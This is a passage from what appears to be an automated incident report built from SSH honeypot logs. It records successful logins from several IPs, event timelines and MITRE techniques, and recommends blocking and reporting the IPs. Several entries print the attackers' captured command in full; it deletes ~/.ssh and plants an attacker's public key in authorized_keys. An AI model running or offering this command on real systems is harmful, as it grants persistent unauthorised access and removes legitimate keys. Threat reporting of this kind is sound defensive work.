| `2026-04-19 06:51:02` | `cowrie.command.failed` |
| `2026-04-19 06:51:03` | `cowrie.log.closed` |
| `2026-04-19 06:51:03` | `cowrie.session.params` |
| `2026-04-19 06:51:03` | `cowrie.command.input` |
| `2026-04-19 06:51:04` | `cowrie.session.file_download` |
| `2026-04-19 06:51:04` | `cowrie.log.closed` |
| `2026-04-19 06:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc28e1ffc5d1

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:51 |
| **Last Seen** | 2026-04-19 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:51:07` | `cowrie.session.connect` |
| `2026-04-19 06:51:07` | `cowrie.client.version` |
| `2026-04-19 06:51:08` | `cowrie.client.kex` |
| `2026-04-19 06:51:09` | `cowrie.login.success` |
| `2026-04-19 06:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102d2792c0ab

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:51 |
| **Last Seen** | 2026-04-19 06:56 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:51:47` | `cowrie.session.connect` |
| `2026-04-19 06:51:47` | `cowrie.client.version` |
| `2026-04-19 06:51:48` | `cowrie.client.kex` |
| `2026-04-19 06:51:49` | `cowrie.login.success` |
| `2026-04-19 06:51:50` | `cowrie.session.params` |
| `2026-04-19 06:51:50` | `cowrie.command.input` |
| `2026-04-19 06:51:50` | `cowrie.command.failed` |
| `2026-04-19 06:51:50` | `cowrie.log.closed` |
| `2026-04-19 06:51:51` | `cowrie.session.params` |
| `2026-04-19 06:51:51` | `cowrie.command.input` |
| `2026-04-19 06:51:51` | `cowrie.session.file_download` |
| `2026-04-19 06:51:51` | `cowrie.log.closed` |
| `2026-04-19 06:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9d2d08a4d72

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:51 |
| **Last Seen** | 2026-04-19 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:51:55` | `cowrie.session.connect` |
| `2026-04-19 06:51:55` | `cowrie.client.version` |
| `2026-04-19 06:51:55` | `cowrie.client.kex` |
| `2026-04-19 06:51:56` | `cowrie.login.success` |
| `2026-04-19 06:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6487082732dc

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:52 |
| **Last Seen** | 2026-04-19 06:57 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:52:32` | `cowrie.session.connect` |
| `2026-04-19 06:52:32` | `cowrie.client.version` |
| `2026-04-19 06:52:32` | `cowrie.client.kex` |
| `2026-04-19 06:52:34` | `cowrie.login.success` |
| `2026-04-19 06:52:34` | `cowrie.session.params` |
| `2026-04-19 06:52:34` | `cowrie.command.input` |
| `2026-04-19 06:52:34` | `cowrie.command.failed` |
| `2026-04-19 06:52:35` | `cowrie.log.closed` |
| `2026-04-19 06:52:36` | `cowrie.session.params` |
| `2026-04-19 06:52:36` | `cowrie.command.input` |
| `2026-04-19 06:52:36` | `cowrie.session.file_download` |
| `2026-04-19 06:52:36` | `cowrie.log.closed` |
| `2026-04-19 06:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a9f01b7b83b

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:52 |
| **Last Seen** | 2026-04-19 06:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:52:40` | `cowrie.session.connect` |
| `2026-04-19 06:52:40` | `cowrie.client.version` |
| `2026-04-19 06:52:40` | `cowrie.client.kex` |
| `2026-04-19 06:52:41` | `cowrie.login.success` |
| `2026-04-19 06:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69617da54f1c

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:53 |
| **Last Seen** | 2026-04-19 06:58 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:53:18` | `cowrie.session.connect` |
| `2026-04-19 06:53:18` | `cowrie.client.version` |
| `2026-04-19 06:53:19` | `cowrie.client.kex` |
| `2026-04-19 06:53:20` | `cowrie.login.success` |
| `2026-04-19 06:53:21` | `cowrie.session.params` |
| `2026-04-19 06:53:21` | `cowrie.command.input` |
| `2026-04-19 06:53:21` | `cowrie.command.failed` |
| `2026-04-19 06:53:21` | `cowrie.log.closed` |
| `2026-04-19 06:53:22` | `cowrie.session.params` |
| `2026-04-19 06:53:22` | `cowrie.command.input` |
| `2026-04-19 06:53:22` | `cowrie.session.file_download` |
| `2026-04-19 06:53:22` | `cowrie.log.closed` |
| `2026-04-19 06:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6f3965b5f53

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:53 |
| **Last Seen** | 2026-04-19 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:53:26` | `cowrie.session.connect` |
| `2026-04-19 06:53:26` | `cowrie.client.version` |
| `2026-04-19 06:53:26` | `cowrie.client.kex` |
| `2026-04-19 06:53:28` | `cowrie.login.success` |
| `2026-04-19 06:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed17eecedeb9

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:53 |
| **Last Seen** | 2026-04-19 06:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:53:52` | `cowrie.session.connect` |
| `2026-04-19 06:53:52` | `cowrie.client.version` |
| `2026-04-19 06:53:52` | `cowrie.client.kex` |
| `2026-04-19 06:53:53` | `cowrie.login.success` |
| `2026-04-19 06:53:53` | `cowrie.session.params` |
| `2026-04-19 06:53:53` | `cowrie.command.input` |
| `2026-04-19 06:53:53` | `cowrie.command.failed` |
| `2026-04-19 06:53:53` | `cowrie.log.closed` |
| `2026-04-19 06:53:54` | `cowrie.session.params` |
| `2026-04-19 06:53:54` | `cowrie.command.input` |
| `2026-04-19 06:53:54` | `cowrie.session.file_download` |
| `2026-04-19 06:53:54` | `cowrie.log.closed` |
| `2026-04-19 06:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4e8e5c50aac

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:53 |
| **Last Seen** | 2026-04-19 06:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:53:56` | `cowrie.session.connect` |
| `2026-04-19 06:53:56` | `cowrie.client.version` |
| `2026-04-19 06:53:56` | `cowrie.client.kex` |
| `2026-04-19 06:53:57` | `cowrie.login.success` |
| `2026-04-19 06:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499e23345805

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:54 |
| **Last Seen** | 2026-04-19 06:59 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:54:53` | `cowrie.session.connect` |
| `2026-04-19 06:54:53` | `cowrie.client.version` |
| `2026-04-19 06:54:53` | `cowrie.client.kex` |
| `2026-04-19 06:54:54` | `cowrie.login.success` |
| `2026-04-19 06:54:55` | `cowrie.session.params` |
| `2026-04-19 06:54:55` | `cowrie.command.input` |
| `2026-04-19 06:54:55` | `cowrie.command.failed` |
| `2026-04-19 06:54:55` | `cowrie.log.closed` |
| `2026-04-19 06:54:56` | `cowrie.session.params` |
| `2026-04-19 06:54:56` | `cowrie.command.input` |
| `2026-04-19 06:54:56` | `cowrie.session.file_download` |
| `2026-04-19 06:54:56` | `cowrie.log.closed` |
| `2026-04-19 06:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1437faf209f5

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:55 |
| **Last Seen** | 2026-04-19 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:55:00` | `cowrie.session.connect` |
| `2026-04-19 06:55:00` | `cowrie.client.version` |
| `2026-04-19 06:55:00` | `cowrie.client.kex` |
| `2026-04-19 06:55:02` | `cowrie.login.success` |
| `2026-04-19 06:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc7c96c3a24

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:55 |
| **Last Seen** | 2026-04-19 06:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:55:36` | `cowrie.session.connect` |
| `2026-04-19 06:55:36` | `cowrie.client.version` |
| `2026-04-19 06:55:37` | `cowrie.client.kex` |
| `2026-04-19 06:55:37` | `cowrie.login.success` |
| `2026-04-19 06:55:38` | `cowrie.session.params` |
| `2026-04-19 06:55:38` | `cowrie.command.input` |
| `2026-04-19 06:55:38` | `cowrie.command.failed` |
| `2026-04-19 06:55:38` | `cowrie.log.closed` |
| `2026-04-19 06:55:38` | `cowrie.session.params` |
| `2026-04-19 06:55:38` | `cowrie.command.input` |
| `2026-04-19 06:55:38` | `cowrie.session.file_download` |
| `2026-04-19 06:55:38` | `cowrie.log.closed` |
| `2026-04-19 06:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917836d7a595

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:55 |
| **Last Seen** | 2026-04-19 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:55:40` | `cowrie.session.connect` |
| `2026-04-19 06:55:40` | `cowrie.client.version` |
| `2026-04-19 06:55:40` | `cowrie.client.kex` |
| `2026-04-19 06:55:41` | `cowrie.login.success` |
| `2026-04-19 06:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7179dea3c4

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:57 |
| **Last Seen** | 2026-04-19 06:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:57:11` | `cowrie.session.connect` |
| `2026-04-19 06:57:11` | `cowrie.client.version` |
| `2026-04-19 06:57:11` | `cowrie.client.kex` |
| `2026-04-19 06:57:12` | `cowrie.login.success` |
| `2026-04-19 06:57:13` | `cowrie.session.params` |
| `2026-04-19 06:57:13` | `cowrie.command.input` |
| `2026-04-19 06:57:13` | `cowrie.command.failed` |
| `2026-04-19 06:57:13` | `cowrie.log.closed` |
| `2026-04-19 06:57:13` | `cowrie.session.params` |
| `2026-04-19 06:57:13` | `cowrie.command.input` |
| `2026-04-19 06:57:14` | `cowrie.session.file_download` |
| `2026-04-19 06:57:14` | `cowrie.log.closed` |
| `2026-04-19 06:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84ebdf57fd50

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:57 |
| **Last Seen** | 2026-04-19 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:57:16` | `cowrie.session.connect` |
| `2026-04-19 06:57:16` | `cowrie.client.version` |
| `2026-04-19 06:57:17` | `cowrie.client.kex` |
| `2026-04-19 06:57:17` | `cowrie.login.success` |
| `2026-04-19 06:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d31932fec690

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:58 |
| **Last Seen** | 2026-04-19 06:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:58:58` | `cowrie.session.connect` |
| `2026-04-19 06:58:58` | `cowrie.client.version` |
| `2026-04-19 06:58:58` | `cowrie.client.kex` |
| `2026-04-19 06:58:59` | `cowrie.login.success` |
| `2026-04-19 06:58:59` | `cowrie.session.params` |
| `2026-04-19 06:58:59` | `cowrie.command.input` |
| `2026-04-19 06:58:59` | `cowrie.command.failed` |
| `2026-04-19 06:58:59` | `cowrie.log.closed` |
| `2026-04-19 06:59:00` | `cowrie.session.params` |
| `2026-04-19 06:59:00` | `cowrie.command.input` |
| `2026-04-19 06:59:00` | `cowrie.session.file_download` |
| `2026-04-19 06:59:00` | `cowrie.log.closed` |
| `2026-04-19 06:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675def15bb2e

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:59 |
| **Last Seen** | 2026-04-19 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:59:03` | `cowrie.session.connect` |
| `2026-04-19 06:59:03` | `cowrie.client.version` |
| `2026-04-19 06:59:03` | `cowrie.client.kex` |
| `2026-04-19 06:59:04` | `cowrie.login.success` |
| `2026-04-19 06:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1cbec66f721

